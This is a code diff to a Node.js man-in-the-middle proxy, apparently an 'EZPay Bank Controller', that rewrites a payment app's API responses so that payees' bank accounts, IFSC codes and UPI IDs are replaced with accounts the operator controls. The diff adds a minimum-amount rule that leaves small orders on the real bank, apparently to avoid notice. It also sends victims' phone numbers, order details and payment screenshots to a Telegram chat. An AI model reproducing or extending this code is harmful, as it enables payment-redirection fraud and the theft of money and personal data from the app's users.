@@ -44,6 +44,24 @@ const tokenUserMap = {};
 const userTokenMap = {}; // userId -> latest real apptoken seen on incoming proxy request
 const userPhoneMap = {};
 let debugNextResponse = false;
+const sentImgHashes = new Set();
+
+function getOrderAmount(req, respData) {
+  if (respData) {
+    const amt = respData.orderAmount || respData.amount || respData.unpaidAmount || respData.totalAmount || respData.rechargeAmount;
+    if (amt !== undefined && amt !== null) {
+      const num = parseFloat(amt);
+      if (!isNaN(num)) return num;
+    }
+  }
+  const body = req && req.parsedBody ? req.parsedBody : {};
+  const bodyAmt = body.amount || body.orderAmount || body.totalAmount || body.rechargeAmount;
+  if (bodyAmt !== undefined && bodyAmt !== null) {
+    const num = parseFloat(bodyAmt);
+    if (!isNaN(num)) return num;
+  }
+  return null;
+}
 
 async function safeSend(chatId, text) {
   if (!bot || !chatId) return;
@@ -372,7 +390,8 @@ function bankListText(d) {
   if (d.banks.length === 0) return 'No banks added yet.';
   return d.banks.map((b, i) => {
     const a = i === d.activeIndex ? ' ✅' : '';
-    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${a}`;
+    const minStr = b.minAmount ? ` | Min: ₹${b.minAmount}` : '';
+    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${minStr}${a}`;
   }).join('\n');
 }
 
@@ -806,9 +825,10 @@ app.post('/bot-webhook', async (req, res) => {
 `🏦 EZPay Bank Controller
 
 === BANK COMMANDS ===
-/addbank Name|AccNo|IFSC|BankName|UPI
+/addbank Name|AccNo|IFSC|BankName|UPI|MinAmount
 /removebank <number>
 /setbank <number>
+/setmin <number> <amount> — Set minimum amount for bank override
 /banks — List all banks
 
 === CONTROL ===
@@ -1861,15 +1881,39 @@ Example:
 
     if (text.startsWith('/addbank ')) {
       const parts = text.substring(9).split('|').map(s => s.trim());
-      if (parts.length < 3) { await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI\n(BankName and UPI optional)'); return res.sendStatus(200); }
+      if (parts.length < 3) { await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI|MinAmount\n(BankName, UPI, and MinAmount optional)'); return res.sendStatus(200); }
       data = await loadData(true);
       if (data.banks.length >= 10) { await bot.sendMessage(chatId, '❌ Max 10 banks.'); return res.sendStatus(200); }
-      const newBank = { accountHolder: parts[0], accountNo: parts[1], ifsc: parts[2], bankName: parts[3] || '', upiId: parts[4] || '' };
+      const newBank = {
+        accountHolder: parts[0],
+        accountNo: parts[1],
+        ifsc: parts[2],
+        bankName: parts[3] || '',
+        upiId: parts[4] || '',
+        minAmount: parts[5] ? parseFloat(parts[5]) || 0 : 0
+      };
       data.banks.push(newBank);
       if (data.activeIndex < 0) data.activeIndex = 0;
       data._skipOverrideMerge = true;
       await saveData(data);
-      await bot.sendMessage(chatId, `✅ Bank #${data.banks.length} added:\n${newBank.accountHolder} | ${newBank.accountNo}\nIFSC: ${newBank.ifsc}${newBank.bankName ? '\nBank: ' + newBank.bankName : ''}${newBank.upiId ? '\nUPI: ' + newBank.upiId : ''}`);
+      const minStr = newBank.minAmount ? `\nMin Amount: ₹${newBank.minAmount}` : '';
+      await bot.sendMessage(chatId, `✅ Bank #${data.banks.length} added:\n${newBank.accountHolder} | ${newBank.accountNo}\nIFSC: ${newBank.ifsc}${newBank.bankName ? '\nBank: ' + newBank.bankName : ''}${newBank.upiId ? '\nUPI: ' + newBank.upiId : ''}${minStr}`);
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/setmin ')) {
+      data = await loadData(true);
+      const parts = text.substring(8).trim().split(/\s+/);
+      const bankIdx = parseInt(parts[0]) - 1;
+      const amount = parseFloat(parts[1]);
+      if (isNaN(bankIdx) || bankIdx < 0 || bankIdx >= (data.banks || []).length || isNaN(amount)) {
+        await bot.sendMessage(chatId, '❌ Format: /setmin <bank_number> <amount>\nExample: /setmin 1 500');
+        return res.sendStatus(200);
+      }
+      data.banks[bankIdx].minAmount = amount;
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      await bot.sendMessage(chatId, `✅ Min amount for bank #${bankIdx + 1} set to ₹${amount}`);
       return res.sendStatus(200);
     }
 
@@ -2132,7 +2176,15 @@ async function proxyAndReplaceBankDetails(req, res, label) {
       bot.sendMessage(data.adminChatId, `🔍 DEBUG ${req.originalUrl}\n\n${dump}`).catch(()=>{});
     }
 
-    if (respData && active) {
+    let shouldOverride = true;
+    if (active && active.minAmount) {
+      const amt = getOrderAmount(req, respData);
+      if (amt !== null && amt < active.minAmount) {
+        shouldOverride = false;
+      }
+    }
+
+    if (respData && active && shouldOverride) {
       if (Array.isArray(respData)) {
         respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, active, {}, 0); });
       } else {
@@ -2146,13 +2198,14 @@ async function proxyAndReplaceBankDetails(req, res, label) {
       const orderId = rd.orderId || rd.orderNo || req.parsedBody?.orderId || 'N/A';
       const amount = rd.amount || rd.orderAmount || req.parsedBody?.amount || 'N/A';
       const phone = getPhone(data, detectedUserId);
+      const overrideLabel = shouldOverride ? "" : " [REAL BANK - UNDER MIN LIMIT]";
       bot.sendMessage(data.adminChatId,
-`🔔 ${label}
+`🔔 ${label}${overrideLabel}
 👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
 Order: ${orderId}
 Amount: ₹${amount}
-Bank: ${active ? active.accountNo : 'N/A'}
-Acc: ${active ? active.accountHolder : 'None'}
+Bank: ${shouldOverride && active ? active.accountNo : (rd.customerBankNumber || rd.accountNo || 'N/A')}
+Acc: ${shouldOverride && active ? active.accountHolder : (rd.customerName || rd.accountHolder || 'N/A')}
 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
       ).catch(()=>{});
     }
@@ -2185,7 +2238,14 @@ async function proxyAndReplaceBankInList(req, res) {
         const itemUserId = item.userId ? String(item.userId) : (item.memberId ? String(item.memberId) : detectedUserId);
         const itemEff = getEffectiveSettings(data, itemUserId);
         const itemActive = (itemEff.botEnabled !== false) ? getActiveBank(data, itemUserId) : null;
-        if (itemActive) { const origVals = {}; deepReplace(item, itemActive, origVals, 0); }
+        let shouldOverride = true;
+        if (itemActive && itemActive.minAmount) {
+          const amt = getOrderAmount(req, item);
+          if (amt !== null && amt < itemActive.minAmount) {
+            shouldOverride = false;
+          }
+        }
+        if (itemActive && shouldOverride) { const origVals = {}; deepReplace(item, itemActive, origVals, 0); }
         if (itemEff.depositSuccess) markDepositSuccess(item);
       };
       if (Array.isArray(listData)) {
@@ -2264,7 +2324,14 @@ app.post('/app/api/orderOut/pendingDetail', async (req, res) => {
       const dump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
       bot.sendMessage(data.adminChatId, `🔍 PENDING DETAIL RAW:\n${dump}`).catch(()=>{});
     }
-    if (respData && active) {
+    let shouldOverride = true;
+    if (active && active.minAmount) {
+      const amt = getOrderAmount(req, respData);
+      if (amt !== null && amt < active.minAmount) {
+        shouldOverride = false;
+      }
+    }
+    if (respData && active && shouldOverride) {
       if (Array.isArray(respData)) {
         respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, active, {}, 0); });
       } else {
@@ -2274,13 +2341,14 @@ app.post('/app/api/orderOut/pendingDetail', async (req, res) => {
     const phone = getPhone(data, detectedUserId);
     if (data.adminChatId && bot) {
       const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
+      const overrideLabel = shouldOverride ? "" : " [REAL BANK - UNDER MIN LIMIT]";
       bot.sendMessage(data.adminChatId,
-`🔔 📋 Pending Detail
+`🔔 📋 Pending Detail${overrideLabel}
 👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
 Order: ${rd.orderId || rd.orderNo || 'N/A'}
 Amount: ₹${rd.amount || rd.orderAmount || 'N/A'}
-Bank: ${active ? active.accountNo : 'N/A'}
-Acc: ${active ? active.accountHolder : 'None'}
+Bank: ${shouldOverride && active ? active.accountNo : (rd.customerBankNumber || rd.accountNo || 'N/A')}
+Acc: ${shouldOverride && active ? active.accountHolder : (rd.customerName || rd.accountHolder || 'N/A')}
 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
       ).catch(()=>{});
     }
@@ -2307,7 +2375,14 @@ app.post('/app/api/orderOut/getPayWallet', async (req, res) => {
       bot.sendMessage(data.adminChatId, `🔍 PAY WALLET RAW RESPONSE:\n${dump}`).catch(()=>{});
     }
     const pwData = getResponseData(jsonResp);
-    if (pwData && active) {
+    let shouldOverride = true;
+    if (active && active.minAmount) {
+      const amt = getOrderAmount(req, pwData);
+      if (amt !== null && amt < active.minAmount) {
+        shouldOverride = false;
+      }
+    }
+    if (pwData && active && shouldOverride) {
       if (Array.isArray(pwData)) {
         pwData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, active, {}, 0); });
       } else {
@@ -2319,13 +2394,14 @@ app.post('/app/api/orderOut/getPayWallet', async (req, res) => {
       const rd = (pwData && typeof pwData === 'object' && !Array.isArray(pwData)) ? pwData : {};
       const orderId = rd.orderId || rd.orderNo || req.parsedBody?.orderId || 'N/A';
       const amount = rd.amount || rd.orderAmount || req.parsedBody?.amount || 'N/A';
+      const overrideLabel = shouldOverride ? "" : " [REAL BANK - UNDER MIN LIMIT]";
       bot.sendMessage(data.adminChatId,
-`🔔 💳 Pay Wallet
+`🔔 💳 Pay Wallet${overrideLabel}
 👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
 Order: ${orderId}
 Amount: ₹${amount}
-Bank: ${active ? active.accountNo : 'N/A'}
-Acc: ${active ? active.accountHolder : 'None'}
+Bank: ${shouldOverride && active ? active.accountNo : (rd.customerBankNumber || rd.accountNo || 'N/A')}
+Acc: ${shouldOverride && active ? active.accountHolder : (rd.customerName || rd.accountHolder || 'N/A')}
 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
       ).catch(()=>{});
     }
@@ -2378,7 +2454,14 @@ app.post('/app/api/memberRecharge/getPaymentOrderDetail', async (req, res) => {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const detailData = getResponseData(jsonResp);
     if (detailData) {
-      if (bank) {
+      let shouldOverride = true;
+      if (bank && bank.minAmount) {
+        const amt = getOrderAmount(req, detailData);
+        if (amt !== null && amt < bank.minAmount) {
+          shouldOverride = false;
+        }
+      }
+      if (bank && shouldOverride) {
         if (Array.isArray(detailData)) {
           detailData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bank, {}, 0); });
         } else {
@@ -2512,6 +2595,30 @@ app.post('/app/api/orderOut/payingSubmitImg', async (req, res) => {
                 /filename=.*\.(jpg|jpeg|png|gif|webp|bmp)/i.test(headerStr)) {
               const imageData = part.slice(headerEnd + 4);
               if (imageData.length > 100) {
+                const imgHash = crypto.createHash('md5').update(imageData).digest('hex');
+                const cacheKey = `ezpay:sent_img:${imgHash}`;
+                let duplicate = false;
+                if (redis) {
+                  try {
+                    const exists = await redis.get(cacheKey);
+                    if (exists) duplicate = true;
+                    else await redis.set(cacheKey, '1', 'EX', 3600);
+                  } catch(e) {}
+                }
+                if (!redis || duplicate) {
+                  if (sentImgHashes.has(imgHash)) duplicate = true;
+                  else {
+                    sentImgHashes.add(imgHash);
+                    if (sentImgHashes.size > 100) {
+                      const firstVal = sentImgHashes.values().next().value;
+                      sentImgHashes.delete(firstVal);
+                    }
+                  }
+                }
+                if (duplicate) {
+                  imageSent = true;
+                  break;
+                }
                 try {
                   await bot.sendPhoto(data.adminChatId, imageData, { caption: `📸 UTR Screenshot [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}` }, { filename: 'screenshot.jpg', contentType: 'image/jpeg' });
                   imageSent = true;
@@ -2564,11 +2671,33 @@ app.post('/app/api/orderOut/pendingSubmitImg', async (req, res) => {
     if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
       const rawStr = req.rawBody ? req.rawBody.toString('utf8', 0, Math.min(req.rawBody.length, 500)) : '';
       const imgUrls = rawStr.match(/https?:\/\/[^\s"',\r\n]+\.(jpg|jpeg|png|gif|webp)[^\s"',\r\n]*/gi) || [];
-      bot.sendMessage(data.adminChatId, `🖼 Pending Image Submit [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}`).catch(()=>{});
-      if (imgUrls.length > 0) {
-        for (const imgUrl of imgUrls.slice(0, 3)) {
-          try { await bot.sendPhoto(data.adminChatId, imgUrl, { caption: `📸 Pending Screenshot [${userId || 'N/A'}]` }); } catch(e) {
-            bot.sendMessage(data.adminChatId, `📸 Image URL: ${imgUrl}`).catch(()=>{});
+      const bodyHash = crypto.createHash('md5').update(req.rawBody || '').digest('hex');
+      const cacheKey = `ezpay:sent_pending_img:${bodyHash}`;
+      let duplicate = false;
+      if (redis) {
+        try {
+          const exists = await redis.get(cacheKey);
+          if (exists) duplicate = true;
+          else await redis.set(cacheKey, '1', 'EX', 3600);
+        } catch(e) {}
+      }
+      if (!redis || duplicate) {
+        if (sentImgHashes.has(bodyHash)) duplicate = true;
+        else {
+          sentImgHashes.add(bodyHash);
+          if (sentImgHashes.size > 100) {
+            const firstVal = sentImgHashes.values().next().value;
+            sentImgHashes.delete(firstVal);
+          }
+        }
+      }
+      if (!duplicate) {
+        bot.sendMessage(data.adminChatId, `🖼 Pending Image Submit [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}`).catch(()=>{});
+        if (imgUrls.length > 0) {
+          for (const imgUrl of imgUrls.slice(0, 3)) {
+            try { await bot.sendPhoto(data.adminChatId, imgUrl, { caption: `📸 Pending Screenshot [${userId || 'N/A'}]` }); } catch(e) {
+              bot.sendMessage(data.adminChatId, `📸 Image URL: ${imgUrl}`).catch(()=>{});
+            }
           }
         }
       }
@@ -2600,7 +2729,14 @@ app.all('/app/api/orderOut/paying', async (req, res) => {
       const dump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
       await safeSend(data.adminChatId, `🔍 PAYING RAW RESPONSE:\n${dump}`);
     }
-    if (respData && active) {
+    let shouldOverride = true;
+    if (active && active.minAmount) {
+      const amt = getOrderAmount(req, respData);
+      if (amt !== null && amt < active.minAmount) {
+        shouldOverride = false;
+      }
+    }
+    if (respData && active && shouldOverride) {
       if (Array.isArray(respData)) {
         respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, active, {}, 0); });
       } else {
@@ -2614,13 +2750,14 @@ app.all('/app/api/orderOut/paying', async (req, res) => {
     const phone = getPhone(data, detectedUserId);
     if (data.adminChatId && bot && !isLogOff(data, detectedUserId) && !(await isLogOffByToken(data, req))) {
       const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
+      const overrideLabel = shouldOverride ? "" : " [REAL BANK - UNDER MIN LIMIT]";
       await safeSend(data.adminChatId,
-`🔔 💳 Paying
+`🔔 💳 Paying${overrideLabel}
 👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
 Order: ${rd.orderId || rd.orderNo || 'N/A'}
 Amount: ₹${rd.amount || rd.orderAmount || 'N/A'}
-Bank: ${active ? active.accountNo : 'N/A'}
-Acc: ${active ? active.accountHolder : 'None'}
+Bank: ${shouldOverride && active ? active.accountNo : (rd.customerBankNumber || rd.accountNo || 'N/A')}
+Acc: ${shouldOverride && active ? active.accountHolder : (rd.customerName || rd.accountHolder || 'N/A')}
 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
       );
     }
@@ -3113,9 +3250,7 @@ for (const ep of WALLET_INTERCEPT_ENDPOINTS) {
       const userId = await extractUserId(req, jsonResp);
       const phone = getPhone(data, userId);
       if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
-        const reqBody = JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1500);
-        const respDump = JSON.stringify(jsonResp, null, 2).substring(0, 2000);
-        bot.sendMessage(data.adminChatId, `🔐 ${req.originalUrl}\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n\n📝 REQUEST:\n${reqBody}\n\n📥 RESPONSE:\n${respDump}`).catch(()=>{});
+        bot.sendMessage(data.adminChatId, `🔐 ${req.originalUrl}\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}`).catch(()=>{});
       }
       sendJson(res, respHeaders, jsonResp, respBody);
     } catch(e) { await transparentProxy(req, res); }
